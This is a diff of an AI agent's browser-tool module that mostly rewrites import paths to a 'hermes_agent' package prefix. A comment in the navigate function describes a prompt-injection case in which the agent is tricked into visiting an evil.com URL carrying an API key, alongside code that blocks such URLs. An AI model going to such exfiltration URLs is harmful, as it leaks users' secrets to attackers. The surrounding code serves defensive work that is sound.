@@ -37,7 +37,7 @@ Environment Variables:
   Set to extend beyond project default. Common values: 600 (10min), 1800 (30min) (default: none)
 
 Usage:
-    from tools.browser_tool import browser_navigate, browser_snapshot, browser_click
+    from hermes_agent.tools.browser_tool import browser_navigate, browser_snapshot, browser_click
 
     # Navigate to a page
     result = browser_navigate("https://example.com", task_id="task_123")
@@ -64,18 +64,18 @@ import time
 import requests
 from typing import Dict, Any, Optional, List, Tuple, Union
 from pathlib import Path
-from agent.auxiliary_client import call_llm
-from hermes_constants import get_hermes_home
-from utils import env_int, is_truthy_value
-from hermes_cli.config import DEFAULT_CONFIG, cfg_get
+from hermes_agent.agent.auxiliary_client import call_llm
+from hermes_agent.hermes_constants import get_hermes_home
+from hermes_agent.utils import env_int, is_truthy_value
+from hermes_agent.hermes_cli.config import DEFAULT_CONFIG, cfg_get
 
 try:
-    from tools.website_policy import check_website_access
+    from hermes_agent.tools.website_policy import check_website_access
 except Exception:
     check_website_access = lambda url: None  # noqa: E731 — fail-open if policy module unavailable
 
 try:
-    from tools.url_safety import (
+    from hermes_agent.tools.url_safety import (
         is_safe_url as _is_safe_url,
         is_always_blocked_url as _is_always_blocked_url,
         normalize_url_for_request as _normalize_url_for_request,
@@ -89,25 +89,25 @@ except Exception:
 # and into ``plugins/browser/<vendor>/``. The dispatcher consults the
 # registry; the legacy class names are re-exported below as backward-compat
 # shims for callers that import them from this module.
-from agent.browser_provider import BrowserProvider as CloudBrowserProvider  # noqa: F401  (legacy alias)
-from agent.browser_registry import (  # noqa: F401  (test-patchable surface)
+from hermes_agent.agent.browser_provider import BrowserProvider as CloudBrowserProvider  # noqa: F401  (legacy alias)
+from hermes_agent.agent.browser_registry import (  # noqa: F401  (test-patchable surface)
     get_provider as _registry_get_browser_provider,
 )
-from plugins.browser.browserbase.provider import (  # noqa: F401  (legacy import surface)
+from hermes_agent.plugins.browser.browserbase.provider import (  # noqa: F401  (legacy import surface)
     BrowserbaseBrowserProvider as BrowserbaseProvider,
 )
-from plugins.browser.browser_use.provider import (  # noqa: F401
+from hermes_agent.plugins.browser.browser_use.provider import (  # noqa: F401
     BrowserUseBrowserProvider as BrowserUseProvider,
 )
-from plugins.browser.firecrawl.provider import (  # noqa: F401
+from hermes_agent.plugins.browser.firecrawl.provider import (  # noqa: F401
     FirecrawlBrowserProvider as FirecrawlProvider,
 )
-from tools.tool_backend_helpers import normalize_browser_cloud_provider
+from hermes_agent.tools.tool_backend_helpers import normalize_browser_cloud_provider
 # Camofox local anti-detection browser backend (optional).
 # When CAMOFOX_URL is set, all browser operations route through the
 # camofox REST API instead of the agent-browser CLI.
 try:
-    from tools.browser_camofox import is_camofox_mode as _is_camofox_mode
+    from hermes_agent.tools.browser_camofox import is_camofox_mode as _is_camofox_mode
 except ImportError:
     _is_camofox_mode = lambda: False  # noqa: E731
 
@@ -211,7 +211,7 @@ def _get_command_timeout() -> int:
     _command_timeout_resolved = True
     result = DEFAULT_COMMAND_TIMEOUT
     try:
-        from hermes_cli.config import read_raw_config
+        from hermes_agent.hermes_cli.config import read_raw_config
         cfg = read_raw_config()
         val = cfg_get(cfg, "browser", "command_timeout")
         if val is not None:
@@ -297,7 +297,7 @@ def _get_cdp_override() -> str:
         return _resolve_cdp_override(env_override)
 
     try:
-        from hermes_cli.config import read_raw_config
+        from hermes_agent.hermes_cli.config import read_raw_config
 
         cfg = read_raw_config()
         browser_cfg = cfg.get("browser", {})
@@ -316,14 +316,14 @@ def _get_dialog_policy_config() -> Tuple[str, float]:
     defaults when keys are absent or invalid.
     """
     # Defer imports so browser_tool can be imported in minimal environments.
-    from tools.browser_supervisor import (
+    from hermes_agent.tools.browser_supervisor import (
         DEFAULT_DIALOG_POLICY,
         DEFAULT_DIALOG_TIMEOUT_S,
         _VALID_POLICIES,
     )
 
     try:
-        from hermes_cli.config import read_raw_config
+        from hermes_agent.hermes_cli.config import read_raw_config
 
         cfg = read_raw_config()
         browser_cfg = cfg.get("browser", {}) if isinstance(cfg, dict) else {}
@@ -376,7 +376,7 @@ def _ensure_cdp_supervisor(task_id: str) -> None:
     if not cdp_url:
         return
     try:
-        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
+        from hermes_agent.tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
 
         policy, timeout_s = _get_dialog_policy_config()
         SUPERVISOR_REGISTRY.get_or_start(
@@ -396,7 +396,7 @@ def _ensure_cdp_supervisor(task_id: str) -> None:
 def _stop_cdp_supervisor(task_id: str) -> None:
     """Stop the CDP supervisor for ``task_id`` if one exists. No-op otherwise."""
     try:
-        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
+        from hermes_agent.tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
 
         SUPERVISOR_REGISTRY.stop(task_id)
     except Exception as exc:
@@ -479,7 +479,7 @@ def _ensure_browser_plugins_loaded() -> None:
     calls early-return inside `_ensure_plugins_discovered`.
     """
     try:
-        from hermes_cli.plugins import _ensure_plugins_discovered
+        from hermes_agent.hermes_cli.plugins import _ensure_plugins_discovered
 
         _ensure_plugins_discovered()
     except Exception as exc:
@@ -509,7 +509,7 @@ def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
 
     resolved: Optional[CloudBrowserProvider] = None
     try:
-        from hermes_cli.config import read_raw_config
+        from hermes_agent.hermes_cli.config import read_raw_config
         cfg = read_raw_config()
         browser_cfg = cfg.get("browser", {})
         provider_key = None
@@ -591,7 +591,7 @@ def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
     return _cached_cloud_provider
 
 
-from hermes_constants import is_termux as _is_termux_environment
+from hermes_agent.hermes_constants import is_termux as _is_termux_environment
 
 
 def _browser_install_hint() -> str:
@@ -657,7 +657,7 @@ def _get_browser_engine() -> str:
 
     # Config file takes priority
     try:
-        from hermes_cli.config import read_raw_config
+        from hermes_agent.hermes_cli.config import read_raw_config
         cfg = read_raw_config()
         val = cfg.get("browser", {}).get("engine")
         if val and str(val).strip():
@@ -985,7 +985,7 @@ def _auto_local_for_private_urls() -> bool:
 
     _auto_local_for_private_urls_resolved = True
     try:
-        from hermes_cli.config import read_raw_config
+        from hermes_agent.hermes_cli.config import read_raw_config
         cfg = read_raw_config()
         browser_cfg = cfg.get("browser", {})
         if isinstance(browser_cfg, dict) and "auto_local_for_private_urls" in browser_cfg:
@@ -1121,7 +1121,7 @@ def _allow_private_urls() -> bool:
     _allow_private_urls_resolved = True
     _cached_allow_private_urls = False  # safe default
     try:
-        from hermes_cli.config import read_raw_config
+        from hermes_agent.hermes_cli.config import read_raw_config
         cfg = read_raw_config()
         browser_cfg = cfg.get("browser", {})
         if isinstance(browser_cfg, dict):
@@ -1188,7 +1188,7 @@ DEFAULT_SESSION_INACTIVITY_TIMEOUT = int(
 def _get_session_inactivity_timeout() -> int:
     result = env_int("BROWSER_INACTIVITY_TIMEOUT", DEFAULT_SESSION_INACTIVITY_TIMEOUT)
     try:
-        from hermes_cli.config import read_raw_config
+        from hermes_agent.hermes_cli.config import read_raw_config
         cfg = read_raw_config()
         val = cfg_get(cfg, "browser", "inactivity_timeout")
         if val is not None:
@@ -1368,7 +1368,7 @@ def _reap_orphaned_browser_sessions():
                 owner_pid = int(Path(owner_pid_file).read_text(encoding="utf-8").strip())
                 # ``os.kill(pid, 0)`` is NOT a no-op on Windows (bpo-14484).
                 # Use the cross-platform existence check.
-                from gateway.status import _pid_exists
+                from hermes_agent.gateway.status import _pid_exists
                 owner_alive = _pid_exists(owner_pid)
             except (ValueError, OSError):
                 owner_alive = None  # corrupt file — fall through
@@ -1398,7 +1398,7 @@ def _reap_orphaned_browser_sessions():
 
         # Check if the daemon is still alive. ``os.kill(pid, 0)`` on Windows
         # is NOT a no-op — use the handle-based existence check.
-        from gateway.status import _pid_exists
+        from hermes_agent.gateway.status import _pid_exists
         if not _pid_exists(daemon_pid):
             shutil.rmtree(socket_dir, ignore_errors=True)
             continue
@@ -1407,7 +1407,7 @@ def _reap_orphaned_browser_sessions():
         # Use the process-tree termination helper so Chromium children
         # (renderer, GPU, etc.) are cleaned up, not just the daemon parent.
         try:
-            from tools.process_registry import ProcessRegistry
+            from hermes_agent.tools.process_registry import ProcessRegistry
             ProcessRegistry._terminate_host_pid(daemon_pid)
             logger.info("Reaped orphaned browser daemon PID %d (session %s)",
                         daemon_pid, session_name)
@@ -1841,7 +1841,7 @@ def _find_agent_browser() -> str:
 
     # Nothing found — try lazy installation before giving up.
     try:
-        from hermes_cli.dep_ensure import ensure_dependency
+        from hermes_agent.hermes_cli.dep_ensure import ensure_dependency
         if ensure_dependency("browser"):
             recheck = shutil.which("agent-browser")
             if not recheck and extended_path:
@@ -1950,7 +1950,7 @@ def _run_browser_command(
         logger.warning("browser command blocked: %s", hint)
         return {"success": False, "error": hint}
 
-    from tools.interrupt import is_interrupted
+    from hermes_agent.tools.interrupt import is_interrupted
     if is_interrupted():
         return {"success": False, "error": "Interrupted"}
 
@@ -2250,7 +2250,7 @@ def _extract_relevant_content(
     # Without this, a page displaying env vars or API keys would leak
     # secrets to the extraction model before run_agent.py's general
     # redaction layer ever sees the tool result.
-    from agent.redact import redact_sensitive_text
+    from hermes_agent.agent.redact import redact_sensitive_text
     extraction_prompt = redact_sensitive_text(extraction_prompt)
 
     try:
@@ -2322,7 +2322,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
     # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
     import urllib.parse
-    from agent.redact import _PREFIX_RE
+    from hermes_agent.agent.redact import _PREFIX_RE
     url_decoded = urllib.parse.unquote(url)
     if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
         return json.dumps({
@@ -2385,7 +2385,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
 
     # Camofox backend — delegate after safety checks pass
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_navigate
+        from hermes_agent.tools.browser_camofox import camofox_navigate
         return camofox_navigate(url, task_id)
 
     if auto_local_this_nav:
@@ -2531,7 +2531,7 @@ def browser_snapshot(
         JSON string with page snapshot
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_snapshot
+        from hermes_agent.tools.browser_camofox import camofox_snapshot
         return camofox_snapshot(full, task_id, user_task)
 
     effective_task_id = _last_session_key(task_id or "default")
@@ -2565,7 +2565,7 @@ def browser_snapshot(
         # supervisor is attached to this task. No-op otherwise. See
         # website/docs/developer-guide/browser-supervisor.md.
         try:
-            from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
+            from hermes_agent.tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
             _supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
             if _supervisor is not None:
                 _sv_snap = _supervisor.snapshot()
@@ -2595,7 +2595,7 @@ def browser_click(ref: str, task_id: Optional[str] = None) -> str:
         JSON string with click result
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_click
+        from hermes_agent.tools.browser_camofox import camofox_click
         return camofox_click(ref, task_id)
 
     effective_task_id = _last_session_key(task_id or "default")
@@ -2633,7 +2633,7 @@ def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
         JSON string with type result
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_type
+        from hermes_agent.tools.browser_camofox import camofox_type
         return camofox_type(ref, text, task_id)
 
     effective_task_id = _last_session_key(task_id or "default")
@@ -2684,7 +2684,7 @@ def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
     _SCROLL_PIXELS = 500
 
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_scroll
+        from hermes_agent.tools.browser_camofox import camofox_scroll
         # Camofox REST API doesn't support pixel args; use repeated calls
         _SCROLL_REPEATS = 5
         result = None
@@ -2720,7 +2720,7 @@ def browser_back(task_id: Optional[str] = None) -> str:
         JSON string with navigation result
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_back
+        from hermes_agent.tools.browser_camofox import camofox_back
         return camofox_back(task_id)
 
     effective_task_id = _last_session_key(task_id or "default")
@@ -2753,7 +2753,7 @@ def browser_press(key: str, task_id: Optional[str] = None) -> str:
         JSON string with key press result
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_press
+        from hermes_agent.tools.browser_camofox import camofox_press
         return camofox_press(key, task_id)
 
     effective_task_id = _last_session_key(task_id or "default")
@@ -2797,7 +2797,7 @@ def browser_console(clear: bool = False, expression: Optional[str] = None, task_
 
     # --- Console output mode (original behaviour) ---
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_console
+        from hermes_agent.tools.browser_camofox import camofox_console
         return camofox_console(clear, task_id)
 
     effective_task_id = _last_session_key(task_id or "default")
@@ -2852,7 +2852,7 @@ def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
     # subprocess path on any error so behaviour is unchanged when no
     # supervisor is running (e.g. plain agent-browser without a CDP backend).
     try:
-        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
+        from hermes_agent.tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
         supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
         if supervisor is not None:
             sup_result = supervisor.evaluate_runtime(expression)
@@ -2946,7 +2946,7 @@ def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
 
 def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
     """Evaluate JS via Camofox's /tabs/{tab_id}/eval endpoint (if available)."""
-    from tools.browser_camofox import _ensure_tab, _post
+    from hermes_agent.tools.browser_camofox import _ensure_tab, _post
     try:
         tab_info = _ensure_tab(task_id or "default")
         tab_id = tab_info.get("tab_id") or tab_info.get("id")
@@ -2984,7 +2984,7 @@ def _maybe_start_recording(task_id: str):
         if task_id in _recording_sessions:
             return
     try:
-        from hermes_cli.config import read_raw_config
+        from hermes_agent.hermes_cli.config import read_raw_config
         hermes_home = get_hermes_home()
         cfg = read_raw_config()
         record_enabled = cfg_get(cfg, "browser", "record_sessions", default=False)
@@ -3038,7 +3038,7 @@ def browser_get_images(task_id: Optional[str] = None) -> str:
         JSON string with list of images (src and alt)
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_get_images
+        from hermes_agent.tools.browser_camofox import camofox_get_images
         return camofox_get_images(task_id)
 
     effective_task_id = _last_session_key(task_id or "default")
@@ -3112,12 +3112,12 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         multimodal tool-result envelope carrying the screenshot and metadata.
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_vision
+        from hermes_agent.tools.browser_camofox import camofox_vision
         return camofox_vision(question, annotate, task_id)
 
     import base64
     import uuid as uuid_mod
-    from hermes_constants import get_hermes_dir
+    from hermes_agent.hermes_constants import get_hermes_dir
     screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
     screenshot_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
     effective_task_id = _last_session_key(task_id or "default")
@@ -3145,7 +3145,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
             _lp_fallback_warning = fb_result.get("fallback_warning")
             fb_path = fb_result.get("data", {}).get("path", "")
             if fb_path and os.path.exists(fb_path):
-                from hermes_constants import get_hermes_dir
+                from hermes_agent.hermes_constants import get_hermes_dir
                 screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
                 screenshots_dir.mkdir(parents=True, exist_ok=True)
                 import shutil as _shutil_vision
@@ -3238,7 +3238,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         # model, attach the screenshot directly instead of describing it through
         # an auxiliary vision LLM. The model inspects the pixels on its next
         # turn — no aux call, no information loss. Consistent with vision_analyze.
-        from tools.vision_tools import (
+        from hermes_agent.tools.vision_tools import (
             _build_native_vision_tool_result,
             _should_use_native_vision_fast_path,
         )
@@ -3282,7 +3282,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         vision_timeout = 120.0
         vision_temperature = 0.1
         try:
-            from hermes_cli.config import load_config
+            from hermes_agent.hermes_cli.config import load_config
             _cfg = load_config()
             _vision_cfg = cfg_get(_cfg, "auxiliary", "vision", default={})
             _vt = _vision_cfg.get("timeout")
@@ -3315,7 +3315,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         try:
             response = call_llm(**call_kwargs)
         except Exception as _api_err:
-            from tools.vision_tools import (
+            from hermes_agent.tools.vision_tools import (
                 _is_image_size_error, _resize_image_for_vision, _RESIZE_TARGET_BYTES,
             )
             if (_is_image_size_error(_api_err)
@@ -3335,7 +3335,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
 
         analysis = (response.choices[0].message.content or "").strip()
         # Redact secrets the vision LLM may have read from the screenshot.
-        from agent.redact import redact_sensitive_text
+        from hermes_agent.agent.redact import redact_sensitive_text
         analysis = redact_sensitive_text(analysis)
         response_data = {
             "success": True,
@@ -3461,7 +3461,7 @@ def _cleanup_single_browser_session(task_id: str) -> None:
     # The inactivity reaper still frees idle resources.
     if _is_camofox_mode():
         try:
-            from tools.browser_camofox import camofox_close, camofox_soft_cleanup
+            from hermes_agent.tools.browser_camofox import camofox_close, camofox_soft_cleanup
             if not camofox_soft_cleanup(task_id):
                 camofox_close(task_id)
         except Exception as e:
@@ -3513,7 +3513,7 @@ def _cleanup_single_browser_session(task_id: str) -> None:
                 pid_file = os.path.join(socket_dir, f"{session_name}.pid")
                 if os.path.isfile(pid_file):
                     try:
-                        from tools.process_registry import ProcessRegistry
+                        from hermes_agent.tools.process_registry import ProcessRegistry
                         daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
                         ProcessRegistry._terminate_host_pid(daemon_pid)
                         logger.debug("Killed daemon pid %s for %s", daemon_pid, session_name)
@@ -3539,7 +3539,7 @@ def cleanup_all_browsers() -> None:
 
     # Tear down CDP supervisors for all tasks so background threads exit.
     try:
-        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
+        from hermes_agent.tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
         SUPERVISOR_REGISTRY.stop_all()
     except Exception:
         pass
@@ -3738,7 +3738,7 @@ def check_browser_vision_requirements() -> bool:
     if not check_browser_requirements():
         return False
     try:
-        from tools.vision_tools import check_vision_requirements
+        from hermes_agent.tools.vision_tools import check_vision_requirements
     except ImportError:
         return False
     return check_vision_requirements()
@@ -3803,7 +3803,7 @@ if __name__ == "__main__":
 # ---------------------------------------------------------------------------
 # Registry
 # ---------------------------------------------------------------------------
-from tools.registry import registry, tool_error
+from hermes_agent.tools.registry import registry, tool_error
 
 _BROWSER_SCHEMA_MAP = {s["name"]: s for s in BROWSER_TOOL_SCHEMAS}
 
